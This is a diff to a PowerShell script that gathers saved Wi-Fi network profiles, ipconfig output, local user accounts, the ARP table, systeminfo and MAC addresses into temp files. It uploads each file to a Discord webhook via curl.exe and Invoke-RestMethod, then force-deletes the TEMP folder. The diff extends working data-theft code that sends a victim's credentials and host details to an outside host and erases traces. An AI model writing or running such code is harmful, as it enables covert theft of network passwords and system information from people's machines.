@@ -21,7 +21,16 @@ Remove-Variable WLANProfileObject
 return $WLANProfileObjects
 }
 $Networks = Get-Networks
-Get-Networks | Export-Csv -Path $env:TMP\WIFI-INFO.csv -NoTypeInformation
+
+Get-Networks | Out-File -FilePath $env:TMP\WIFI-INFO.txt
+ipconfig /all | Out-File -FilePath $env:TMP\ipconfig.txt
+net user | Out-File -FilePath $env:TMP\users.txt
+arp -a | Out-File -FilePath $env:TMP\arp.txt
+systeminfo | Out-File -FilePath $env:TMP\systeminfo.txt
+getmac /v | Out-File -FilePath $env:TMP\mac.txt
+
+
+
 function Upload-Discord {
 
 [CmdletBinding()]
@@ -44,7 +53,14 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
-Upload-Discord -file $env:TMP\WIFI-INFO.csv
+Upload-Discord -file $env:TMP\WIFI-INFO.txt
+Upload-Discord -file $env:TMP\ipconfig.txt
+Upload-Discord -file $env:TMP\users.txt
+Upload-Discord -file $env:TMP\arp.txt
+Upload-Discord -file $env:TMP\systeminfo.txt
+Upload-Discord -file $env:TMP\mac.txt
+
+
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
 
